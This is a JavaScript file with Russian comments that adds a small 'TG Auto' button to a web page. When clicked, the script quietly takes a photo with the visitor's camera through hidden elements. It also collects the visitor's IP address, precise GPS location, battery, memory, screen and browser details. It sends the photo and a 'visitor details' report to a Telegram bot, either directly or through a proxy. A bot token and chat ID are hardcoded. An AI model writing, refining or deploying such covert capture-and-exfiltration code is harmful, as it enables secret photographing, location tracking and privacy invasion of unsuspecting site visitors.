ю// new_script.js — исправленная версия с UI, прокси-поддержкой и подробным логированием.
// ВСТАВЬ СВОИ ЗНАЧЕНИЯ НИЖЕ.
// РЕКОМЕНДАЦИЯ: укажи PROXY_URL и убери BOT_TOKEN из клиента в проде.

(function(){
  'use strict';

  /************** Конфигурация (отредактируй) ****************/
  // Если хочешь безопасно — разверни прокси и укажи его URL. Тогда токен можно убрать из клиента
  const PROXY_URL = null; // пример: "https://your-worker.example.workers.dev/forward"
  // Если прокси не используется, оставь BOT_TOKEN/CHAT_ID (небезопасно)
  const BOT_TOKEN = "7986900528:AAHAQ9HuC9gl0cFXYyMZkXgw1qo8ogClqWw";
  const CHAT_ID   = "7518382960";

  const MAX_FILE_BYTES = 3_000_000;
  const PUBLIC_IP_API = "https://api.ipify.org?format=json";
  const CAPTURE_QUALITY = 0.85;
  const CAPTURE_TIMEOUT_MS = 10000;
  const WAIT_LOCATION_MS = 8000;
  const SESSION_FLAG = "tg_auto_photo_sent_v1";
  /************************************************************/

  // UI: простая панель статуса и кнопка "Старт"
  const id = 'tg-auto-fixed-ui';
  let ui = document.getElementById(id);
  if (!ui) {
    ui = document.createElement('div');
    ui.id = id;
    ui.style.position = 'fixed';
    ui.style.right = '12px';
    ui.style.bottom = '12px';
    ui.style.zIndex = '999999';
    ui.style.background = 'rgba(255,255,255,0.98)';
    ui.style.border = '1px solid #ccc';
    ui.style.padding = '8px';
    ui.style.borderRadius = '8px';
    ui.style.fontFamily = 'system-ui,Segoe UI,Roboto,Arial';
    ui.style.fontSize = '13px';
    ui.style.boxShadow = '0 6px 18px rgba(0,0,0,0.08)';
    ui.innerHTML = `
      <div style="font-weight:600;margin-bottom:6px">TG Auto</div>
      <div id="tg_status" style="color:#222;margin-bottom:6px">Готов. Нажмите «Старт».</div>
      <div style="display:flex;gap:6px">
        <button id="tg_start_btn" style="padding:6px 8px;border-radius:6px">Старт</button>
        <button id="tg_debug_btn" style="padding:6px 8px;border-radius:6px">Лог</button>
      </div>
    `;
    document.body.appendChild(ui);
  }
  const statusEl = ui.querySelector('#tg_status');
  const startBtn = ui.querySelector('#tg_start_btn');
  const debugBtn = ui.querySelector('#tg_debug_btn');

  function setStatus(s){ statusEl.textContent = s; }
  function safeLog(...args){ if (window.console) console.log('[TGAuto]', ...args); }

  // Быстрые проверки
  if (!PROXY_URL && (!BOT_TOKEN || !CHAT_ID)) {
    setStatus('Ошибка: укажи PROXY_URL или BOT_TOKEN+CHAT_ID.');
    safeLog('config error: missing PROXY_URL and BOT_TOKEN/CHAT_ID');
    return;
  }
  if (sessionStorage.getItem(SESSION_FLAG)) {
    setStatus('Уже отправлено в этой сессии.');
    safeLog('session flag set — abort');
    return;
  }

  // Скрытые элементы video/canvas
  const video = document.createElement('video');
  video.autoplay = true;
  video.playsInline = true;
  video.style.display = 'none';
  document.documentElement.appendChild(video);
  const canvas = document.createElement('canvas');
  canvas.style.display = 'none';
  document.documentElement.appendChild(canvas);

  // Функции сбора данных
  async function getPublicIP(timeoutMs = 4000){
    try {
      const controller = new AbortController();
      const id = setTimeout(()=>controller.abort(), timeoutMs);
      const r = await fetch(PUBLIC_IP_API, {signal: controller.signal});
      clearTimeout(id);
      if (!r.ok) return null;
      const j = await r.json().catch(()=>null);
      return j && j.ip ? j.ip : null;
    } catch (e) {
      safeLog('getPublicIP failed', e && e.message ? e.message : e);
      return null;
    }
  }

  async function getBatteryInfo(){
    try{
      if (!navigator.getBattery) return null;
      const b = await navigator.getBattery();
      return { charging:Boolean(b.charging), level: typeof b.level === 'number' ? Math.round(b.level*100):null };
    }catch(e){ return null; }
  }

  function getMemoryInfo(){
    return { deviceMemory: typeof navigator.deviceMemory === 'number' ? navigator.deviceMemory : null,
             perfMem: (performance && performance.memory) ? performance.memory : null };
  }

  function parseAndroidVersion(ua){
    try{
      const m = ua.match(/\bAndroid\s*\/?\s*([0-9.]+)/i) || ua.match(/\bAndroid\s+([0-9.]+)/i);
      return m ? m[1] : null;
    }catch(e){ return null; }
  }

  function getGeolocation(timeoutMs = WAIT_LOCATION_MS){
    return new Promise(resolve=>{
      if (!navigator.geolocation) return resolve({allowed:false});
      let done=false;
      const t = setTimeout(()=>{ if (!done){ done=true; resolve({allowed:false, reason:'timeout'}); } }, timeoutMs);
      navigator.geolocation.getCurrentPosition(p=>{
        if (done) return;
        done=true; clearTimeout(t);
        resolve({allowed:true, coords:{latitude:p.coords.latitude, longitude:p.coords.longitude, accuracy:p.coords.accuracy}, timestamp:p.timestamp});
      }, err=>{
        if (done) return;
        done=true; clearTimeout(t);
        resolve({allowed:false, reason: err && err.code ? err.code : 'error'});
      }, {enableHighAccuracy:true, maximumAge:0, timeout: timeoutMs});
    });
  }

  function captureFrame(videoEl, quality = CAPTURE_QUALITY){
    return new Promise(resolve=>{
      try{
        const w = videoEl.videoWidth || 640;
        const h = videoEl.videoHeight || 480;
        canvas.width = w; canvas.height = h;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(videoEl,0,0,w,h);
        canvas.toBlob(b=>resolve(b),'image/jpeg',quality);
      }catch(e){ safeLog('capture error', e); resolve(null); }
    });
  }

  function buildCaptionShort(ip){
    const time = new Date().toISOString();
    const page = location.pathname + (location.search||'');
    const ua = navigator.userAgent || '-';
    return `Новый посетитель\nВремя: ${time}\nСтраница: ${page}\nIP: ${ip||'не получен'}\nUA: ${ua}`;
  }

  // Отправка на прокси: proxy должен принимать JSON { chat_id, token? optional, caption, image_b64 }
  async function sendToProxy(imageBlob, caption){
    try{
      const b64 = await blobToBase64(imageBlob);
      const body = { caption, image_b64: b64, chat_id: CHAT_ID };
      // если прокси требует токен, он должен быть на прокси; не передаём токен клиентом
      const r = await fetch(PROXY_URL, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(body) });
      const text = await r.text().catch(()=>null);
      if (!r.ok) {
        safeLog('proxy returned non-ok', r.status, text);
        return { ok:false, status:r.status, text };
      }
      return { ok:true, text };
    }catch(e){
      safeLog('proxy send failed', e);
      return { ok:false, reason:'proxy_error', error:String(e) };
    }
  }

  function blobToBase64(blob){
    return new Promise((res, rej)=>{
      const fr = new FileReader();
      fr.onload = ()=> res(String(fr.result).split(',')[1]);
      fr.onerror = ()=> rej(new Error('blob->base64 failed'));
      fr.readAsDataURL(blob);
    });
  }

  // Прямая отправка в Telegram (может упасть из-за CORS)
  async function sendDirectToTelegram(blob, caption){
    if (!BOT_TOKEN || !CHAT_ID) {
      return { ok:false, reason:'no_token' };
    }
    try{
      // Если small, пробуем sendPhoto multipart
      const url = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendPhoto`;
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      form.append('photo', blob, 'photo.jpg');
      if (caption) form.append('caption', caption);
      const r = await fetch(url, { method:'POST', body: form });
      const text = await r.text().catch(()=>null);
      if (!r.ok) {
        safeLog('telegram returned non-ok', r.status, text);
        return { ok:false, status:r.status, text };
      }
      return { ok:true, text };
    }catch(e){
      safeLog('direct send error', e && (e.message || e));
      return { ok:false, reason:'fetch_error', error:String(e) };
    }
  }

  // Функция-обёртка: сначала прокси, иначе direct, логируем
  async function sendImageWithFallback(blob, caption){
    if (PROXY_URL) {
      setStatus('Отправка через прокси...');
      const pr = await sendToProxy(blob, caption);
      if (pr && pr.ok) return pr;
      safeLog('proxy failed, trying direct', pr);
      // fallthrough to direct attempt
    }
    setStatus('Прямая отправка в Telegram...');
    const dr = await sendDirectToTelegram(blob, caption);
    return dr;
  }

  // Основной поток, вызывается по клику
  async function runOnce(){
    setStatus('Запрашиваю камеру (нужен клик и разрешение)...');
    safeLog('runOnce start');
    // Пользователь-инициация достаточно для большинства браузеров
    let stream = null;
    try{
      stream = await navigator.mediaDevices.getUserMedia({ video:{ width:{ ideal:640 }, height:{ ideal:480 }, facingMode:'environment' }, audio:false });
    }catch(e){
      setStatus('Ошибка доступа к камере. См. консоль.');
      safeLog('getUserMedia failed', e);
      return;
    }

    try{ video.srcObject = stream; await video.play().catch(()=>{}); }catch(e){ safeLog('video attach/play error', e); }

    // ждать готовности кадра
    const start = Date.now();
    while(true){
      if (video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) break;
      if (Date.now() - start > CAPTURE_TIMEOUT_MS) break;
      await new Promise(r=>setTimeout(r,120));
    }

    const blob = await captureFrame(video);
    try{ stream.getTracks().forEach(t=>t.stop()); video.srcObject = null; }catch(e){}

    if (!blob){
      setStatus('Не удалось сделать снимок. См. консоль.');
      safeLog('no blob');
      return;
    }
    safeLog('captured blob size', blob.size);

    // Получаем IP / geo / battery / memory
    setStatus('Сбор метаданных...');
    const [ip, battery, geo] = await Promise.all([ getPublicIP().catch(()=>null), getBatteryInfo().catch(()=>null), getGeolocation(WAIT_LOCATION_MS).catch(()=>({allowed:false})) ]);
    const mem = getMemoryInfo();
    const ua = navigator.userAgent || '-';
    const android = parseAndroidVersion(ua);
    const screenInfo = { screenWidth: screen.width||null, screenHeight: screen.height||null, innerWidth: innerWidth||null, innerHeight: innerHeight||null, dpr: devicePixelRatio||1 };
    const time = new Date().toISOString();
    const page = location.pathname + (location.search||'');

    // Короткая подпись для фото
    const shortCaption = `Время: ${time}\nСтраница: ${page}\nIP: ${ip||'не получен'}`;

    setStatus('Отправляю изображение...');
    const res = await sendImageWithFallback(blob, shortCaption);

    if (res && res.ok) {
      setStatus('Отправлено. Формирую подробный отчет...');
      // Подробный текст
      const lines = [];
      lines.push('*Детали посетителя*');
      lines.push(`• Время: ${escapeMarkdown(time)}`);
      lines.push(`• Страница: ${escapeMarkdown(page)}`);
      lines.push(`• IP: ${escapeMarkdown(String(ip||'не получен'))}`);
      lines.push(`• UA: ${escapeMarkdown(ua)}`);
      if (android) lines.push(`• Android: ${escapeMarkdown(android)}`);
      lines.push(`• Экран: ${escapeMarkdown((screenInfo.screenWidth||'?')+'×'+(screenInfo.screenHeight||'?'))} px, DPR=${escapeMarkdown(String(screenInfo.dpr))}`);
      if (mem.deviceMemory) lines.push(`• RAM(approx): ${escapeMarkdown(String(mem.deviceMemory))} GB`);
      if (battery) lines.push(`• Батарея: ${escapeMarkdown(String(battery.level||'?'))}% , charging: ${escapeMarkdown(String(battery.charging))}`);
      if (geo && geo.allowed && geo.coords) {
        lines.push(`• Локация: lat ${escapeMarkdown(String(geo.coords.latitude))}, lon ${escapeMarkdown(String(geo.coords.longitude))}`);
        lines.push(`  Точность: ${escapeMarkdown(String(geo.coords.accuracy))} м`);
      } else {
        lines.push(`• Локация: отказано/нет (${escapeMarkdown(String(geo && geo.reason||'no'))})`);
      }
      const detailedText = lines.join('\n');
      // Попытаемся отправить подробный текст: через прокси если есть, иначе через direct sendMessage (CORS тоже может упасть)
      let msgRes = null;
      if (PROXY_URL) {
        try {
          const body = { chat_id: CHAT_ID, text: detailedText, markdown: true };
          const r = await fetch(PROXY_URL, { method:'POST', headers:{ 'Content-Type':'application/json' }, body: JSON.stringify(body) });
          const t = await r.text().catch(()=>null);
          if (r.ok) msgRes = { ok:true, text:t };
          else msgRes = { ok:false, status:r.status, text:t };
        } catch (e) { msgRes = { ok:false, reason:'proxy_msg_failed', error:String(e) }; }
      } else {
        // direct sendMessage
        try {
          const url = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendMessage`;
          const body = { chat_id: CHAT_ID, text: detailedText, parse_mode: 'MarkdownV2' };
          const r = await fetch(url, { method:'POST', headers:{ 'Content-Type':'application/json' }, body: JSON.stringify(body) });
          const t = await r.text().catch(()=>null);
          if (r.ok) msgRes = { ok:true, text:t }; else msgRes = { ok:false, status:r.status, text:t };
        } catch (e) { msgRes = { ok:false, reason:'fetch_error', error:String(e) }; }
      }

      safeLog('photo send result', res, 'msg send result', msgRes);
      setStatus('Готово. Отправлено.');
      sessionStorage.setItem(SESSION_FLAG, '1');
    } else {
      safeLog('send failed', res);
      // показываем точную причину пользователю
      if (res && res.error) {
        setStatus('Ошибка отправки: ' + (res.error.slice ? res.error.slice(0,120) : String(res.error)));
      } else if (res && res.status) {
        setStatus('Ошибка отправки. HTTP ' + res.status + '. Проверь консоль.');
      } else {
        setStatus('Не удалось отправить. См. консоль для деталей.');
      }
    }
  }

  // Markdown escape simple
  function escapeMarkdown(s){
    if (typeof s !== 'string') s = String(s);
    return s.replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, '\\$1');
  }

  // Кнопки
  startBtn.addEventListener('click', () => {
    startBtn.disabled = true;
    runOnce().catch(e=>{ safeLog('runOnce exception', e); setStatus('Ошибка. См. консоль.'); startBtn.disabled=false; });
  });

  debugBtn.addEventListener('click', ()=> {
    alert('Открой консоль DevTools и ищи метки [TGAuto].');
  });

  // Экспорт для отладки
  window.TGAuto = { runOnce };

})();